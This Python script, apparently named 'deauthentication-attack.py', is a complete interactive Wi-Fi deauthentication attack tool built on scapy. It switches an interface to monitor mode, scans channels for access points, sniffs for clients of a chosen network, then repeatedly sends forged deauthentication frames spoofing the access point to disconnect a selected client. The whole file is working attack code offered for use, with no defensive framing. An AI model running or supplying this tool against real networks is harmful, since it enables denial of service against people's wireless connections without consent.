import sys
import os
from threading import Thread
import pandas
import time
from scapy.all import *

from frametypes import *
from subtypes import *

manufacturers = {}
management_subtypes =  (ManagmentFrameSubType.AssociationRequest, 
                        ManagmentFrameSubType.ReassociationRequest,
                        ManagmentFrameSubType.ProbeRequest,
                        ManagmentFrameSubType.Authentication, 
                        ManagmentFrameSubType.Action)

control_subtypes = (ControlFrameSubType.BA,
                    ControlFrameSubType.BAR,
                    ControlFrameSubType.RTS)

data_subtypes = (DataFrameSubType.QoS_Data,
                 DataFrameSubType.QOS_NULL)

observed_clients = {}
clients_counter = 1 #Index for each client

networks_dic = {}
networks_counter = 1 #Index for each network
target_ap = ""

# Initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "INDEX"])
# Set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    global networks_counter
    if packet.haslayer(Dot11Beacon):
        # Extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # Extract the name of it
        ssid = packet[Dot11Elt].info.decode()

        if bssid not in networks_dic.values():
            networks_dic[networks_counter] = bssid
            networks.loc[bssid] = (ssid, networks_counter)
            networks_counter += 1

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        '''
        Switch channel from 1 to 14 each 0.5s - also known as channel hoping
        Since an AP can advertise BEACON frames in different channels 
        (i.e. different frequencies), we must scan a variety of channels
        '''
        ch = ch % 14 + 1
        time.sleep(0.5)

def change_to_monitor(interface):
    os.system("ifconfig " + interface + " down")
    os.system("iwconfig " + interface + " mode monitor")
    os.system("ifconfig " + interface + " up")

def test(packet):
    temp = "68:ff:7b:b5:aa:e4"
    if packet.haslayer(Dot11):
        if packet[Dot11].addr2 == temp:
            print("********** new packet **********")
            print (packet[Dot11].addr1)

def discover_clients_of_ap(ap_mac, packet):
    global clients_counter

    #Check if this is a client's packet and the destination is the target AP
    if (packet.type == FrameType.Data and packet.subtype in data_subtypes \
        and packet.addr1 == ap_mac) or \
        (packet.type == FrameType.Control and packet.subtype in control_subtypes \
        and packet.addr1 == ap_mac) or \
        (packet.type == FrameType.Management and packet.subtype in management_subtypes \
        and packet.addr1 == ap_mac):    
            if packet.addr2 not in observed_clients.values():
                address = packet.addr2
                #Retrive manufacturer from address (if exists)
                manufacturer = get_manufacturer(packet.addr2)
                if(manufacturer != False):
                    address = manufacturer + packet.addr2[8:]

                print (str(clients_counter) + ". " + address + " Type: " + \
                        str(packet.type) + " Subtype: " + str(packet.subtype))
                observed_clients[clients_counter] = packet.addr2
                clients_counter += 1

def get_manufacturer(mac_address):
    #Read first 3 bytes from MAC address
    bytes_mac_address = mac_address.split(':')
    manufacturer = bytes_mac_address[0] + bytes_mac_address[1] + bytes_mac_address[2] 
    #Convert it to uppercase letter
    manufacturer = manufacturer.upper()

    if manufacturer in manufacturers:
        return manufacturers[manufacturer]
    
    return False
        
def load_manufacturers():
     with open('manufacturers.txt') as f:
        lines = f.readlines()

        for line in lines:
            split_line = line.split('\t')
            #split_line[0]=MAC address, #split_line[1]=Manufacturer
            manufacturers[split_line[0]] = split_line[1].rstrip()#Remove line feed

    
def discover_clients(packet):
    discover_clients_of_ap(target_ap, packet)

def run_deauthenticate(iface, dest_mac, src_mac):
    thread = threading.Thread(target=deauthenticate, args=(iface, dest_mac, src_mac))
    #TODO: Check how it works without a thread
    thread.start()
    for i in range(15):
        time.sleep(2)
        print(".", end='', flush=True)
    #Stop the running thread
    print(".")
    thread.do_run = False

def deauthenticate(interface, dest_mac, src_mac):
    t = threading.currentThread()
    pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=dest_mac, addr2=src_mac, addr3=src_mac)/scapy.all.Dot11Deauth()
    while getattr(t, "do_run", True):
        scapy.all.sendp(pkt, iface=interface, count=1, verbose=0)

def get_index_input(message, input_dict):
    while True:
        index = input(message + ":\n")
        if index.isdigit():
            #convert index from string to int
            index = int(index)
            if(index in input_dict):
                break
        print("Wrong index, try again")
    
    print("") #New line
    return index
         
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print ("Usage: sudo python3 deauthentication-attack.py <INTERFACE>")
        exit(0)
    else:
        #Load list of manufacturers to a dictionary
        load_manufacturers()

        interface = sys.argv[1]
        change_to_monitor(interface)
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        sniffer = AsyncSniffer(prn=callback, iface=interface)
        sniffer.start()
        time_to_sniff = 10
        counter = time_to_sniff
        print("Scanning for available networks", end='', flush=True)
        while counter >= 0:
            counter = counter-1
            time.sleep(1)
            print(".", end='', flush=True)
        sniffer.stop()
        os.system("clear")

        print("================================================================")
        print(networks)
        print("================================================================", end='\n\n')

        index = get_index_input("Choose network index to scan for connected clients", networks_dic)
        #Extract the name of network based on it's index in the data frame
        ssid = networks[networks['INDEX']==index]['SSID'].values[0]
        print("Scanning for available clients at network '{}'...".format(ssid))

        #Get the target AP MAC address
        target_ap = networks_dic[index]

        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 7)
        print("Scan finished.")
        if(not observed_clients):
            print("Couldn't find clients on network '{}'. Try run the script again.".format(ssid))
        else:
            client_ind = get_index_input("Choose client index to start the attack", observed_clients)
            print("Starting to attack client '{}'".format(observed_clients[client_ind]), end='', flush=True)
            #Send de-authentication packets
            run_deauthenticate(interface, observed_clients[client_ind], target_ap)
            print("Done")


